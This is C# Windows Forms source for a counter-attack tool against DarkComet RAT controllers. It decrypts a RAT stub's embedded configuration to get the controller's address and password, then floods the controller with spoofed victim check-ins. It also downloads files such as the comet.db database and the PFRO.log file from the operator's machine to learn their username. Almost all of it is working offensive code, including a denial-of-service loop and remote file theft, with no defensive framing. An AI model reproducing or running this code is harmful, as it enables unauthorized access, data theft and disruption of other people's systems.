using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DarkComet_Fucker
{
    public partial class Form1 : Form
    {
        static Flooder flooder = new Flooder();
        static Thread workerThread = new Thread(flooder.Flood);

        public Form1()
        {
            InitializeComponent();
            workerThread.Start();
            cmbRobar.Items.Add("Database");
            cmbRobar.Items.Add("Custom");
        }

        private void btnBuscar_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();

            openFileDialog1.Filter = "Ejecutables (.exe)|*.exe";
            openFileDialog1.FilterIndex = 1;
            openFileDialog1.Multiselect = false;
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK) 
            {
                grpJuguetes.Enabled = false;
                txtRuta.Text = openFileDialog1.FileName;
                string config = Utils.GetConfig(txtRuta.Text);
                tblKeys.Rows.Add("Version", Utils.getVersion(txtRuta.Text));
                config = Utils.RC4(Utils.unhexlify(config), Utils.versionPassword);
                string[] config_lines = config.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
                for (int i = 1; i < config_lines.Length - 1; i++)
                {
                    string[] line_split = config_lines[i].Split('=');
                    string key = line_split[0];
                    string value = line_split[1].Substring(1, line_split[1].Length - 2);
                    if (key.ToLower().Equals("pwd")) Utils.serverPassword = value;
                    if (key.ToLower().Equals("netdata"))
                    {
                        string[] netdata = value.Split(':');
                        Utils.serverIP = netdata[0];
                        Utils.serverPort = Convert.ToInt32(netdata[1]);
                    }

                    tblKeys.Rows.Add(key, value);
                }
            }

            if (!String.IsNullOrEmpty(Utils.serverIP) || !String.IsNullOrEmpty(Utils.serverPassword) || (Utils.serverPort > 0)) 
            {
                Connection.startSocket(); 
                
                if(Connection.IsSocketConnected()){
                    grpJuguetes.Enabled = true; 
                }
            }
        }
        
        private void btnFlood_Click(object sender, EventArgs e)
        {
            try
            {
                if (btnFlood.Text.ToUpper().Equals("STOP FLOOD"))
                {
                    btnFlood.Text = "START FLOOD";
                    flooder.RequestStop();
                }
                else
                {
                    btnFlood.Text = "STOP FLOOD";
                    flooder.Continue();
                }
            }
            catch (Exception ex) { }
        }

        private void btnRobarRemotos_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Aún no he descubierto cómo hacerlo :P");
        }

        public string GetFlood()
        {
            return btnFlood.Text;
        }

        private void cmbRobar_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch(cmbRobar.SelectedIndex)
            {
                case 0:
                    txtRobar.Text = "comet.db";
                    break;
                case 1:
                    txtRobar.Text = "";
                    txtRobar.Enabled = true;
                    break;
                default: return;
            }
            btnRobar.Enabled = true;
        }

        private void btnRobar_Click(object sender, EventArgs e)
        {
            btnFlood.Text = "START FLOOD";
            flooder.RequestStop();

            SaveFileDialog openFileDialog1 = new SaveFileDialog();

            openFileDialog1.Filter = "Todos los archivos (*.*)|*.*";
            openFileDialog1.FilterIndex = 1;
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                Connection.ObtenerArchivo(txtRobar.Text, openFileDialog1.FileName);
                MessageBox.Show("Archivo robado\n"+openFileDialog1.FileName);
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            System.Environment.Exit(0);
        }

        private void btnInfo_Click(object sender, EventArgs e)
        {
            btnInfo.Enabled = false;
            /* Archivos con el nombre de usuario:
             * - C:\Windows\PFRO.log
             * - C:\Windows\DirectX.log
             * */
            if (Connection.ArchivoExiste(@"C:\Windows\PFRO.log"))
            {
                string fname = System.Environment.CurrentDirectory + "\\" + new Random().Next() + "_pfro.log";
                Connection.ObtenerArchivo(@"C:\Windows\PFRO.log", fname);
                string pfro = File.ReadAllText(fname).Replace("\0", string.Empty);
                string username = pfro.Split(new String[] { @"Users\" }, StringSplitOptions.None)[1].Split(new String[] { @"\" }, StringSplitOptions.None)[0];

                tblInfo.Rows.Add("Usuario", username);
            }
            btnInfo.Enabled = true;
        }
    }

    public class Flooder
    {
        public void Flood()
        {
            string rcvbuf, sndbuf;
            rcvbuf = "FIRST";
            sndbuf = "infoesGuest16|1.1.1.1/ [6.9.6.9] : 6969|Blau/Indetectables.NET|769734|0s|Windows BLAU|x||ES||1234|00%|Spain ES /-- |6/13/2012 at 2:45:59 PM|5.3.0";
            while (true)
            {
                if (!_shouldStop)
                {
                    switch(rcvbuf)
                    {
                        case "FIRST":
                            rcvbuf = Utils.decrypt(Connection.readString());
                            break;
                        case "IDTYPE":
                            Connection.sendString(Utils.encrypt("SERVER"));
                            rcvbuf = "";
                            break;
                        default:
                            Connection.sendString(Utils.encrypt(sndbuf));
                            break;
                    }                    
                    
                }
            }
        }
        public void RequestStop()
        {
            _shouldStop = true;
        }

        public void Continue()
        {
            _shouldStop = false;
        }

        private volatile bool _shouldStop = true;
    }
}
